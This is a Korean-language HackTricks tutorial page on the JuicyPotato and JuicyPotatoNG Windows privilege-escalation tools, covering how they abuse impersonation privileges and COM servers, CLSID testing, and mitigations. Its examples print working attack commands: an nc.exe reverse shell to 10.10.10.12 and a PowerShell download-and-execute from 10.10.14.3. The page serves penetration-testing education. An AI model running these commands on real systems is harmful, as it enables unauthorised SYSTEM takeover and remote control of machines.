# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato는 legacy입니다. 일반적으로 Windows 10 1803 / Windows Server 2016까지의 Windows 버전에서 작동합니다. Windows 10 1809 / Server 2019부터 적용된 Microsoft의 변경 사항으로 인해 기존 technique이 작동하지 않게 되었습니다. 해당 빌드 및 이후 버전에서는 PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato 등과 같은 최신 대안을 고려하세요. 최신 옵션과 사용법은 아래 페이지를 참조하세요.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (golden privileges 악용) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_약간의 juice를 더한_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_의 개선 버전, 즉 **Windows Service Accounts에서 NT AUTHORITY\SYSTEM으로의 또 다른 Local Privilege Escalation tool**_<sup>[[1]](#references)</sup>

#### [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)에서 juicypotato를 다운로드할 수 있습니다.

### Compatibility quick notes

- 현재 context에 SeImpersonatePrivilege 또는 SeAssignPrimaryTokenPrivilege가 있는 경우 Windows 10 1803 및 Windows Server 2016까지 안정적으로 작동합니다.
- Windows 10 1809 / Windows Server 2019 및 이후 버전에서는 Microsoft의 hardening으로 인해 작동하지 않습니다. 해당 빌드에서는 위에 링크된 대안을 우선 사용하세요.

### Summary <a href="#summary" id="summary"></a>

[**juicy-potato Readme에서 발췌**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) 및 그 [variants](https://github.com/decoder-it/lonelypotato)는 `SeImpersonate` 또는 `SeAssignPrimaryToken` privileges가 있을 때 MiTM listener가 `127.0.0.1:6666`에 위치하는 [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126)를 기반으로 한 privilege escalation chain을 활용합니다. Windows build를 검토하던 중 `BITS`가 의도적으로 비활성화되어 있고 port `6666`이 사용 중인 환경을 발견했습니다.

우리는 [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)를 weaponize하기로 했습니다. **Juicy Potato를 소개합니다.**

> 이론은 [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)을 참조하고, 연결된 링크와 references를 따라가세요.<sup>[[4]](#references)</sup>

`BITS` 외에도 여러 COM servers를 악용할 수 있습니다. COM servers는 다음 조건만 충족하면 됩니다.

1. 현재 user가 instantiation할 수 있어야 하며, 일반적으로 impersonation privileges를 가진 “service user”입니다.
2. `IMarshal` interface를 구현해야 합니다.
3. elevated user(SYSTEM, Administrator, …)로 실행되어야 합니다.

몇 차례의 testing 후 여러 Windows 버전에서 [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/)의 광범위한 목록을 확보하고 테스트했습니다.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato를 사용하면 다음을 수행할 수 있습니다.<sup>[[1]](#references)</sup>

- **Target CLSID** _원하는 CLSID를 선택합니다._ [_여기_](http://ohpe.it/juicy-potato/CLSID/)에서 _OS별로 정리된 목록을 확인할 수 있습니다._
- **COM Listening port** _marshalled hardcoded 6666 대신 원하는 COM listening port를 정의합니다._
- **COM Listening IP address** _server를 모든 IP에 bind합니다._
- **Process creation mode** _impersonated user의 privileges에 따라 다음 중에서 선택할 수 있습니다._
- `CreateProcessWithToken` (`SeImpersonate` 필요)
- `CreateProcessAsUser` (`SeAssignPrimaryToken` 필요)
- `both`
- **Process to launch** _exploitation이 성공하면 executable 또는 script를 launch합니다._
- **Process Argument** _launched process의 arguments를 customize합니다._
- **RPC Server address** _stealthy approach를 위해 external RPC server에 authenticate할 수 있습니다._
- **RPC Server port** _external server에 authenticate하려고 할 때 firewall이 port `135`를 차단하는 경우 유용합니다…_
- **TEST mode** _주로 testing purposes, 즉 CLSID testing에 사용됩니다. DCOM을 생성하고 token의 user를 출력합니다. 테스트 방법은_ [_여기_](http://ohpe.it/juicy-potato/Test/)를 _참조하세요._

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 최종 정리 <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

사용자에게 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한이 있다면 **SYSTEM**입니다.

이러한 모든 COM Servers의 악용을 방지하는 것은 거의 불가능합니다. `DCOMCNFG`를 통해 이러한 객체의 권한을 수정하는 방법을 생각해 볼 수 있지만, 쉽지 않을 것입니다.

실질적인 해결책은 `* SERVICE` 계정으로 실행되는 민감한 계정과 애플리케이션을 보호하는 것입니다. `DCOM`을 중지하면 확실히 이 exploit을 차단할 수 있지만, 기본 OS에 심각한 영향을 미칠 수 있습니다.

출처: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG는 다음을 결합하여 최신 Windows에서 JuicyPotato 스타일의 local privilege escalation을 다시 구현합니다:<sup>[[2]](#references)</sup>
- 기존의 하드코딩된 127.0.0.1:6666 listener를 피하기 위해, 선택한 port의 local RPC server에 대한 DCOM OXID resolution.
- RpcImpersonateClient가 필요하지 않은 상태에서 인바운드 SYSTEM authentication을 캡처하고 impersonate하기 위한 SSPI hook. 이를 통해 SeAssignPrimaryTokenPrivilege만 있는 경우에도 CreateProcessAsUser를 사용할 수 있습니다.
- DCOM activation 제약 조건을 충족하기 위한 tricks (예: PrintNotify / ActiveX Installer Service classes를 대상으로 할 때 필요했던 이전의 INTERACTIVE-group requirement).

중요 참고 사항 (build에 따라 동작이 계속 변경됨):<sup>[[2]](#references)</sup>
- 2022년 9월: “INTERACTIVE trick”을 사용하는 초기 technique은 지원되는 Windows 10/11 및 Server targets에서 동작했습니다.
- 2023년 1월 authors의 update: Microsoft는 이후 INTERACTIVE trick을 차단했습니다. 다른 CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7})를 사용하면 exploitation이 복원되지만, authors의 post에 따르면 Windows 11 / Server 2022에서만 가능합니다.

기본 사용법 (도움말에서 더 많은 flags 확인):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Windows 10 1809 / Server 2019을 대상으로 하며 classic JuicyPotato가 patch된 경우, 상단에 링크된 alternatives(RoguePotato, PrintSpoofer, EfsPotato/GodPotato 등)를 우선 사용하세요. NG는 build와 service state에 따라 상황에 맞게 사용해야 할 수 있습니다.

## Examples

참고: 시도해 볼 CLSIDs 목록은 [이 페이지](https://ohpe.it/juicy-potato/CLSID/)를 방문하세요.

### nc.exe reverse shell 얻기
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 새 CMD 실행(RDP access가 있는 경우)

![Powershell rev - 새 CMD 실행(RDP access가 있는 경우): 새 CMD 실행(RDP access가 있는 경우)](<../../images/image (300).png>)

## CLSID 문제

JuicyPotato가 사용하는 기본 CLSID가 **작동하지 않아** exploit이 실패하는 경우가 많습니다. 일반적으로 **작동하는 CLSID**를 찾으려면 여러 번 시도해야 합니다. 특정 운영 체제에서 시도할 CLSID 목록을 확인하려면 다음 페이지를 방문하세요.

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSID 확인**

먼저 juicypotato.exe 외에 몇 가지 executable이 필요합니다.

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)을 다운로드하여 PS session에 로드하고, [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)을 다운로드하고 실행합니다. 해당 script는 테스트할 수 있는 CLSID 목록을 생성합니다.

그런 다음 [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)을 다운로드하고(CLSID 목록과 juicypotato executable의 경로를 변경) 실행합니다. 이 파일은 모든 CLSID를 시도하며, **port number가 변경되면 CLSID가 작동했다는 의미입니다**.

작동하는 CLSID를 **-c parameter를 사용하여 확인**합니다.

## References

- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [JuicyPotato에 두 번째 기회 주기: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Juicy Potato project page (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Service Accounts에서 SYSTEM으로의 Privilege Escalation](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
